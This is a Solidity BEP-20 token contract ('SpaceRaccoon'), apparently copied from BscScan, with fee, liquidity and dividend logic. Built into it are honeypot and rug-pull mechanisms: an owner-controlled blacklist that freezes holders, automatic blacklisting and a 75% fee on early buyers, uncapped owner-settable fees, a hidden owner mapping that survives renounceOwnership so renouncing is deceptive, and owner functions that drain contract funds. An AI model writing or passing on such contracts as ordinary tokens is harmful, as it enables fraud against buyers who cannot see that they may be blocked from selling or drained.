/**
 *Submitted for verification at BscScan.com on 2022-07-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    mapping (address => bool) internal owner_;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address deployer) {
        _owner = deployer;
        owner_[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(owner_[msg.sender], "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address payable adr) public virtual onlyOwner {
        _owner = adr;
        owner_[adr] = true;
        emit OwnershipTransferred(_owner,adr);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}


abstract contract baseToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyLPDividendFee = 2;
    uint256 public _buyMarketingFee = 2;
    uint256 public _buyLPFee = 1;
    
    uint256 public _sellLPDividendFee = 2;
    uint256 public _sellMakingFee = 2;
    uint256 public _sellLPFee = 1;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _ChosenSon;

    ISwapRouter public router;
    address public _mainPair;
    mapping(address => bool) public _swapPairList;
    address marketingAddress;
    
    uint256 public startAddLPBlock;
    uint256 public startTradeBlock;

    bool public swapEnabled = true;
    uint256 public swapThreshold;
    uint256 public maxSwapThreshold;

    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address deployer,string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable(deployer) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        router = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        marketingAddress = msg.sender;
        swapThreshold = total / 5000;
        maxSwapThreshold = total / 200;

        _feeWhiteList[marketingAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 0.05 ether;

        _balances[deployer] = total;
        emit Transfer(address(0), deployer, total);
    }

    function symbol() external view override returns (string memory) {return _symbol;}
    function name() external view override returns (string memory) {return _name;}
    function decimals() external view override returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_ChosenSon[from], "ChosenSon");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 airdropAmount = amount / 10000000;
            address ad;
            for(int i=0;i < 5;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(from,ad,airdropAmount);
            }
            amount -= airdropAmount;
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    if(_swapPairList[from]){_ChosenSon[to] = true;}
                    return;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (swapEnabled && contractTokenBalance > 0) {
                            if(contractTokenBalance > maxSwapThreshold)contractTokenBalance = maxSwapThreshold;
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);
        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellMakingFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyMarketingFee + _buyLPFee + _buyLPDividendFee;
            }
            uint256 swapAmount = tAmount * swapFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
 
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 totalFee = _buyMarketingFee + _buyLPDividendFee + _buyLPFee + _sellMakingFee + _sellLPDividendFee + _sellLPFee;
        totalFee += totalFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / totalFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        totalFee -= lpFee;
        uint256 BNBBalance = address(this).balance;
        uint256 fundAmount = BNBBalance * (_buyMarketingFee + _sellMakingFee) * 2 / totalFee;

        if(fundAmount>0){
            (bool tmpSuccess,) = payable(marketingAddress).call{value: fundAmount, gas: 30000}("");
            // Supress warning msg
            tmpSuccess = false;
        }

        if (lpAmount > 0) {
            uint256 lpBNBAmount = BNBBalance * lpFee / totalFee;
            if (lpBNBAmount > 0) {
                router.addLiquidityETH{value: lpBNBAmount}(
                address(this),
                lpAmount,
                0,
                0,
                marketingAddress,
                block.timestamp
            );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setBuyFee(uint256 dividendFee,uint256 marketingFee,uint256 LPFee) external onlyOwner {
        _buyMarketingFee = marketingFee;
        _buyLPDividendFee = dividendFee;
        _buyLPFee = LPFee;
    }

    function setSellFee(uint256 dividendFee,uint256 marketingFee,uint256 LPFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
        _sellMakingFee = marketingFee;
        _sellLPFee = LPFee;
    }

    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _swapThreshold;
        maxSwapThreshold = _maxSwapThreshold;
    }

    function openAddLP() external onlyOwner {
        if(startAddLPBlock == 0){
            startAddLPBlock = block.number;
        }else{
            startAddLPBlock = 0;
        }
    }

    function openTrade() external onlyOwner {
        if(startAddLPBlock == 0){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
    }
 

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setChosenSon(address addr, bool enable) external onlyOwner {
        _ChosenSon[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address addr,uint256 amountPercentage) external onlyOwner {
        payable(addr).transfer(address(this).balance*amountPercentage / 100);
    }

    function claimToken(address token,address addr, uint256 amountPercentage) external onlyOwner {
        uint256 amountToken = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(addr,amountToken * amountPercentage / 100);
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }
        uint256 balance = address(this).balance;
        if (balance < holderRewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();
        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 shareholderCount = holders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    (bool tmpSuccess,) = payable(shareHolder).call{value: amount, gas: 30000}("");
                    // Supress warning msg
                    tmpSuccess = false;
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
    
    /* Airdrop */
    function Airdrop(address[] calldata addresses, uint256 tAmount) external onlyOwner {
        require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
        uint256 SCCC = tAmount * addresses.length;
        require(balanceOf(owner()) >= SCCC, "Not enough tokens in wallet");
        for(uint i=0; i < addresses.length; i++){
            _balances[owner()] = _balances[owner()] - tAmount;
            _takeTransfer(owner(),addresses[i],tAmount);
        }
    }

}

contract Token is baseToken {
    constructor() baseToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x8288a5e1C0d2C6BdfFa9Dee71D5eAA083CDC4BE4),
        "SpaceRaccoon",
        "SpaceRAC",
        18,
        1000 * 10 ** 12
    ){
    }
}